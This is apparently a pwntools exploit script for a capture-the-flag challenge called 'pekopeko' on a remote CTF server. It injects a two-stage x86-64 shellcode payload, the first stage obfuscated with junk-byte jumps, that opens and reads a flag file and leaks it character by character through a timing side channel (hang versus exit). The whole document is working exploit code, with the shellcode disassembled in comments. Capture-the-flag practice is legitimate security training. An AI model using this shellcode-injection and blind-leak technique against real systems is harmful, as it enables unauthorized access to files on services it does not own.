from pwn import *

context.arch = 'amd64'

flag = 'A'
idx = 1
while flag[-1] != '}':
    for i in range(33, 127):
        # p = process('./pekopeko')
        p = remote('ctf.adl.tw', 10008)

        p.sendafter(b'it?\n', b'yes')

        payload = b'\x90\x90\x90\xeb\x01\x87\x49\x89\xD7\x48\x31\xFF\xeb\x03\x90\x90\x87\x49\x83\xC7\x50\x4C\x89\xfe\xeb\x02\x90\x87\x48\xC7\xC2\xFF\xFF\x00\x00\xeb\x02\x90\x87\x48\x31\xC0\x0F\x05\x41\xFF\xE7'
        # payload = '
        # \x90\x90\x90\xeb\x02\x87
        # \x49\x89\xD7                          mov r15, rdx
        # \x48\x31\xFF                          xor rdi,rdi
        # \xeb\x03\x90\x90\x87                  jmp
        # \x49\x83\xC7\x50                      add r15, 0x50
        # \x4C\x89\xFE                          mov rsi, r15
        # \xeb\x02\x90\x87                      jmp
        # \x48\xC7\xC2\xFF\xFF\x00\x00          mov rdx, 0xff
        # \xeb\x02\x90\x87                      jmp
        # \x48\x31\xC0                          xor rax,rax
        # \x0F\x05                              syscall
        # \x41\xFF\xE7                          jmp    r15

        payload = payload + b'\x87' * (64-len(payload))

        # pause()
        p.sendafter(b'You will pass the course.\n', payload)

        payload = asm(f'''
            mov rax, 0x67616c
            push rax
            mov rax, 0x662f6f6b65706f6b
            push rax
            mov rax, 0x65702f656d6f682f
            push rax
            mov rdi, rsp
            xor rsi, rsi
            xor rdx, rdx
            mov rax, 2
            syscall     /* open */

            mov rdi, rax
            mov rsi, 0x406e00
            mov rdx, 0x30
            xor rax, rax
            syscall     /* read */

            mov rax, 0x406e00
            add al, {idx}
            mov bl, byte ptr [rax]
            cmp bl, {i}
            jne exit
        loop:
            jmp loop
        exit:
            xor rax, rax
            mov al, 60
            syscall
        ''')

        p.send(payload)
        try:
            p.recv(timeout=0.1)
            flag += chr(i)
            print(flag)
            idx += 1
            break
        except EOFError:
            pass
        finally:
            p.close()
            if i >= 126:
                print(flag)
                exit(0)

print(flag)
